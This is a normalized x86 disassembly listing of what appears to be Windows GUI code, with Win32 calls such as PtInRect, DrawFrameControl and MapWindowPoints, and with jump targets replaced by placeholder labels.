mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_44a3a8
mov eax [ ebx + 0x14 ]
call sub_44a738
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_44af40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_44a6c0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44a6c0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_44a6c0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44a28c
mov esi eax
mov edx 0x2
mov eax ebx
call sub_44a28c
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_44a6c0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_44a798
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44a7c0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44a798
call sub_44af40
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44a7c0
call sub_44af40
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_44a2f8
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_44a2f8
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_44b16c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_445284
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_445248
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_414b3c
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b200
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_44b16c
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44a7c0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44aa0c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44a7c0
call sub_44af40
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_44b288
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40442c
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x8 ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404a68
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_44b2d0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b4c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_44b9a0
mov eax [ ebp - 0x8 ]
call sub_44a99c
xor edx edx
push ebp
push sub_44b4ab
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b4b2
mov eax [ ebp - 0x8 ]
call sub_44a9a0
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a174
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
push ebp
lea eax [ ebp - 0xc ]
call sub_44b288
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_4038bc
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44a494
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_44b288
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_441c84
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_442a7c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4036c0
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_44b4d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_414b64
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4224e8
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b530
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0x80000014
call sub_421a00
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_42215c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_4220fc
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_4220fc
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0x80000010
call sub_421a00
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_4220fc
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4220fc
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44b5b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_44b4d8
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_44b530
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_44b530
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_44b4d8
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_44b530
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_44b530
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_44b694
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b7ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_440940
mov eax [ ebp - 0x4 ]
call sub_422134
xor eax eax
push ebp
push sub_44b7cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422568
xor eax eax
push ebp
push sub_44b7b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_445284
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7b7
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_422568
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_445248
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_441704
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44b7f8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_447018
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4417ac
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_441768
mov ecx eax
xor edx edx
xor eax eax
call sub_414b64
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_448484
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414b8c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_44b96c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44b96c
pop ecx
mov eax ebx
call sub_4036c0
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44b96c
pop ecx
sub_44b9a0
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_44b96c
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4036c0
xor eax eax
mov [ esi + 0x64 ] eax
sub_44b9fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44aa0c
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_44ba38
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44ba38
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44bca5
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov edx [ ebp - 0x8 ]
pop eax
call sub_4046ec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov eax [ ebx + 0x14 ]
call sub_44a198
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406660
mov edx [ ebp - 0x10 ]
pop eax
call sub_4046ec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4036c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bcac
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404450
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_44a548
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_44a6c0
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_44a6fc
mov eax [ ebx + 0x18 ]
call sub_44a548
mov [ edx + 0x18 ] eax
push esi
push sub_44c248
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44aa74
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_44a6fc
mov eax [ esi + 0x64 ]
call sub_44a6c0
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4036c0
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_44c220
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4036c0
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44a244
mov edx eax
mov eax edi
call sub_44a6e8
mov eax edi
call sub_44a548
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_44c248
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44aa74
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_44c248
mov edx [ eax + 0x14 ]
mov eax esi
call sub_44aa74
mov eax [ ebx + 0x14 ]
call sub_4036c0
mov eax edi
call sub_4036c0
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_44bcb4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_447018
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_4086c8
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_44a6e8
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_446f84
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_44a6e8
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_44c0d0
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_44c248
xor edx edx
mov eax edi
call sub_44aa74
sub_44bd90
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44a6c0
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402ab8
mov edx eax
mov eax ebx
call sub_44a6e8
sub_44bdcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
